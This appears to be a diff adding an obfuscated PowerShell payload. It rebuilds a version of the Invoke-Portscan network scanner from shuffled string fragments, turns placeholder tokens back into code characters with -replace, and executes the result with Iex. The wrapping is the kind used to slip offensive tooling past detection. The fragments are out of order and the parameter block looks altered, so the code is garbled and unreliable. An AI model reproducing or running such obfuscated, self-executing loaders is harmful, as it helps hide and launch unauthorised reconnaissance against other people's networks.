+            Write-PortscanOut -comment UBHJendMsg -grepStream UBHJgrepStream -xmlStream UBHJxmlStream -readableStream UBHJreadableStream
+
+            if(UBHJgrepStream) {
+                UBHJgrepStream.Close()
+            }
+            if (UBHJxmlStream) ','scovery,
+                [Parameter()] [System.IO.StreamWriter] UBHJgrepStream,
+                [Parameter()] [System.Xml.XmlWriter] UBHJxmlStream,
+                [Parameter()] [System.IO.StreamWriter] UBHJreadableStream
+
+            )
+            switch (UBHJPSCmdlet.ParameterSetName)
+            {
+                Xi1jCommentXi1j
+                {
+
+                    Write-Verbose UBHJcomment
+
+                    if (UBHJgrepStream) {
+                        UBHJgrepStream.WriteLine(Xi1j# Xi1j + UBHJcomment)
+                    }
+                    if (UBHJxmlStream) {
+                        UBHJxmlStream.WriteComment(UBHJcomment)
+                    }
+                    if (UBHJreadableStream) {
+                        UBHJreadableStream.WriteLine(UBHJcomment)
+                    }
+                }
+                Xi1jHostOutXi1j
+                {
+                    UBHJoPort = [string]::join(Xi1j,Xi1j, UBHJopenPorts.ToArray())
+                    UBHJcPort = [string]::join(Xi1j,Xi1j, UBHJclosedPorts.ToArray())
+                    UBHJfPort = [string]::join(Xi1j,Xi1j, UBHJfilteredPorts.ToArray())
+
+                    if (UBHJgrepStream) {
+                       #for grepstream use tabs - can be ugly, but easier for regex
+              ','                       UBHJxmlStream.WriteStartElement(Xi1jPortsXi1j)
+                        foreach(UBHJp in UBHJopenPorts) {
+                            UBHJxmlStream.writestartElement(Xi1jPortXi1j)
+                            UBHJxmlStream.WriteAttributeString(Xi1jidXi1j, [string]UBHJp)
+                            UBHJxmlStream.WriteAttributeString(Xi1jstateXi1j, Xi1jopenXi1j)
+                            UBHJxmlStream.WriteEndElement()
+
+                        }
+                        foreach (UBHJp in UBHJclosedPorts) {
+                            UBHJxmlStream.writestartElement(Xi1jPortXi1j)
+                            UBHJxmlStream.WriteAttributeString(Xi1jidXi1j, [string]UBHJp)
+                            UBHJxmlStream.WriteAttributeString(Xi1jstateXi1j, Xi1jclosedXi1j)
+                            UBHJxmlStream.WriteEndElement()
+                        }
+                        foreach (UBHJp in UBHJfilteredPorts) {
+                            UBHJxmlStream.writestartElement(Xi1jPortXi1j)
+                            UBHJxmlStream.WriteAttributeString(Xi1jidXi1j, [string]UBHJp)
+                            UBHJxmlStream.WriteAttributeString(Xi1jstateXi1j, Xi1jfilteredXi1j)
+                            UBHJxmlStream.WriteEndElement()
+                        }
+
+                        UBHJxmlStream.WriteEndElement()
+                        UBHJxmlStream.WriteEndElement()
+                    }
+                    if (UBHJreadableStream) {
+                        UBHJreadableStream.writeline(Xi1jPorscan.ps1 scan report for UBHJouthostXi1j)
+                        if (UBHJisUp) {
+                            UBHJreadableStream.writeline(Xi1jHost is upXi1j)
+                        }
+
+                        if (UBHJisUp -or UBHJSkipDi','scan
+Author: Rich Lundeen (http://webstersProdigy.net)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+
+.DESCRIPTION
+
+Does a simple port scan using regular sockets, based (pretty) loosely on nmap
+
+.NOTES
+
+version .13
+
+.PARAMETER Hosts
+
+Include these comma seperated hosts (supports IPv4 CIDR notation) or pipe them in
+
+.PARAMETER HostFile
+
+Input hosts from file rather than commandline
+
+.PARAMETER ExcludeHosts
+
+Exclude these comma seperated hosts
+
+.PARAMETER Ports
+
+Include these comma seperated ports (can also be a range like 80-90)
+
+.PARAMETER PortFile
+
+Input ports from a file
+
+.PARAMETER TopPorts
+
+Include the x top ports - only goes to 1000, default is top 50
+
+.PARAMETER ExcludedPorts
+
+Exclude these comma seperated ports
+
+.PARAMETER Open
+
+Only show hosts with open ports.
+
+.PARAMETER SkipDiscovery
+
+Treat all hosts as online, skip host discovery
+
+.PARAMETER PingOnly
+
+Ping scan only (disable port scan)
+
+.PARAMETER DiscoveryPorts
+
+Comma separated ports used for host discovery. -1 is a ping
+
+.PARAMETER Threads
+
+number of max threads for the thread pool (pe','BHJPorts -pList UBHJportList 9OtU write-host
+            }
+            if(UBHJPortFile)
+            {
+                Parse-IpPorts(UBHJPortFile) 9OtU write-host
+            }
+            if(UBHJportList.Count -eq 0)
+            {
+                if (UBHJTopPorts)
+                {
+                    Get-TopPort(UBHJTopPorts) 9OtU write-host
+                }
+                else
+                {
+                    #if the ports still arenLCrt set, give the deftault, top 50 ports
+                    Get-TopPort(50) 9OtU write-host
+                }
+            }
+            if (UBHJExcludedPorts)
+            {
+                Remove-Ports -ExcludedPorts UBHJExcludedPorts 9O',' ) ; Xi1j UBHJ(UBHJofs = LCrLCr )Xi1j +[sTRING] ((geT-varIAbLe (LCrfP0zLCr+LCrt5LCr) -va )[- 1.. -( (geT-varIAbLe (LCrfP0zLCr+LCrt5LCr) -va ).lENgTH)] )+Xi1jUBHJ(Sv LCrOfsLCr LCr LCr )Xi1j
+                    }
+
+                    return UBHJFalse
+           ','r host)
+
+.PARAMETER nHosts
+
+number of hosts to concurrently scan
+
+.PARAMETER Timeout
+
+Timeout time on a connection in miliseconds before port is declared filtered
+
+.PARAMETER SleepTimer
+
+Wait before thread checking, in miliseconds
+
+.PARAMETER SyncFreq
+
+How often (in terms of hosts) to sync threads and flush output
+
+.PARAMETER T
+
+[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)
+    5 {UBHJnHosts=30;  UBHJThreads = 1000; UBHJTimeout = 750  }
+    4 {UBHJnHosts=25;  UBHJThreads = 1000; UBHJTimeout = 1200 }
+    3 {UBHJnHosts=20;  UBHJThreads = 100;  UBHJTimeout = 2500 }
+    2 {UBHJnHosts=15;  UBHJThreads = 32;   UBHJTimeout = 3000 }
+    1 {UBHJnHosts=10;  UBHJThreads = 32;   UBHJTimeout = 5000 }
+
+.PARAMETER GrepOut
+
+Greppable output file
+
+.PARAMETER XmlOut
+
+output XML file
+
+.PARAMETER ReadableOut
+
+output file in LCrreadableLCr format
+
+.PARAMETER AllformatsOut
+
+output in readable (.nmap), xml (.xml), and greppable (.gnmap) formats
+
+.PARAMETER noProgressMeter
+
+Suppresses the progress meter
+
+.PARAMETER quiet
+
+supresses returned output and donLCrt store hosts in memory - useful for very large scans
+
+.PARAMETER ForceOverwrite
+
+Force Overwrite if output Files exist. Otherwise it throws exception
+
+.EXAMPLE
+
+C:Q8aLPS> Invoke-Portscan -Hosts Xi1jwebstersprodigy.net,google.com,microsoft.comXi1j -TopPorts 50
+
+Description
+-----------
+Scans the top 50 ports for hosts found for webstersprodigy.net,google.com, and microsoft.com
+
+.EXAMPLE
+
+C:Q8aLPS> echo webstersprodigy.net 9OtU Invoke-Portscan -oG test.gnmap -f -ports Xi1j80,443,8080Xi1j
+
+Description
+-----------
+Does a portscan of Xi1jwebstersprodigy.netXi1j, and writes a greppable output file
+
+.EXAMPLE
+
+C:Q8aLPS> Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet
+
+Description
+-----------
+Scans the top 20 ports for hosts found in the 192.168.1.1/24 range, outputs all file formats
+
+.LINK
+
+http://webstersprodigy.net
+#>
+
+    [CmdletBinding()]Param (
+        #Host, Ports
+        [Parameter(ParameterSetName=Xi1jcmdHostsXi1j,
+
+                   ValueFromPipeline=UBHJTrue,
+                   Mandatory = UBHJTrue)]
+                   [String[]] UBHJHosts,
+
+        [Parameter(ParameterSetName=Xi1jfHostsXi1j,
+                   Mandatory = UBHJTrue)]
+                   [Alias(Xi1jiLXi1j)]
+                   [String]  UBHJHostFile,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jexcludeXi1j)]
+                   [String] UBHJExcludeHosts,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jpXi1j)]
+                   [String] UBHJPorts,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jiPXi1j)]
+                   [String] UBHJPortFile,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [String] UBHJTopPorts,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jxPortsXi1j)]
+                   [String] UBHJExcludedPorts,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Switch] UBHJOpen,
+
+        #Host Discovery
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jPnXi1j)]
+                   [Switch] UBHJSkipDiscovery,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jsnXi1j)]
+                   [Switch] UBHJPingOnly,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jPSXi1j)]
+                   [string] UBHJDiscoveryPorts = Xi1j-1,445,80,443Xi1j,
+
+        #Timing and Performance
+        [Parameter(Mandatory = UBHJ$true)]
+                   [int] UBHJThreads = 100,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [int] UBHJnHosts = 25,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [int] UBHJTimeout = 2000,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [int] UBHJSleepTimer = 500,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [int] UBHJSyncFreq = 1024,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [int] UBHJT,
+
+        #Output
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1joGXi1j)]
+                   [String] UBHJGrepOut,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1joXXi1j)]
+                   [String] UBHJXmlOut,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1joNXi1j)]
+                   [String] UBHJReadableOut,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1joAXi1j)]
+                   [String] UBHJAllformatsOut,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Switch] UBHJnoProgressMeter,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jqXi1j)]
+                   [Switch] UBHJquiet,
+
+        [Parameter(Mandatory = UBHJ$true)]
+                   [Alias(Xi1jFXi1j)]
+                   [Switch] UBHJForceOverwrite
+
+        #TODO add script parameter
+        #TODO add resume parameter
+    )
+
+    PROCESS {
+
+        Set-StrictMode -Version 2.0
+
+        UBHJversion = .13
+        UBHJhostList = New-Object System.Collections.ArrayList
+        UBHJportList = New-Object System.Collections.ArrayList
+        UBHJhostPortList = New-Object System.Collections.ArrayList
+
+        UBHJscannedHostList = @()
+
+        function Parse-Hosts
+        {
+            Param (
+                [Parameter(Mandatory = UBHJTrue)] [String] UBHJHosts
+            )
+
+            [String[]] UBHJiHosts = UBHJHosts.Split(Xi1j,Xi1j)
+
+            foreach(UBHJiHost in UBHJiHosts)
+            {
+                UBHJiHost = UBHJiHost.Replace(Xi1j Xi1j, Xi1jXi1j)
+
+                if(!UBHJiHost)
+                {
+                    continue
+                }
+
+                if(UBHJiHost.contains(Xi1j/Xi1j))
+                {
+                    UBHJnetPart = UBHJiHost.split(Xi1j/Xi1j)[0]
+                    [uint32]UBHJmaskPart = UBHJiHost.split(Xi1j/Xi1j)[1]
+
+                    UBHJaddress = [System.Net.IPAddress]::Parse(UBHJnetPart)
+
+                    if (UBHJmaskPart -ge UBHJaddress.GetAddressBytes().Length * 8)
+                    {
+                        throw Xi1jBad host maskXi1j
+                    }
+
+                    UBHJnumhosts = [System.math]::Pow(2,((UBHJaddress.GetAddressBytes().Length *8) - UBHJmaskPart))
+
+                    UBHJstartaddress = UBHJaddress.GetAddressBytes()
+                    [array]::Reverse(UBHJstartaddress)
+
+                    UBHJstartaddress = [System.BitConverter]::ToUInt32(UBHJstartaddress, 0)
+                    [uint32]UBHJstartMask = ([System.math]::Pow(2, UBHJmaskPart)-1) * ([System.Math]::Pow(2,(32 - UBHJmaskPart)))
+                    UBHJstartAddress = UBHJstartAddress -band UBHJstartMask
+
+                    #in powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary
+                    UBHJstartAddress = [System.BitConverter]::GetBytes(UBHJstartaddress)[0..3]
+                    [array]::Reverse(UBHJstartaddress)
+
+                    UBHJaddress = [System.Net.IPAddress] [byte[]] UBHJstartAddress
+
+                    UBHJhostList.Add(UBHJaddress.IPAddressToString)
+
+                    for (UBHJi='))-CREPLacE  'Xi1j',[cHAr]34-rEPLAce 'UBHJ',[cHAr]36  -CREPLacE 'Q8aL',[cHAr]92  -rEPLAce '9OtU',[cHAr]124  -CREPLacE 'BwN',[cHAr]96-rEPLAce 'LCr',[cHAr]39) | Iex
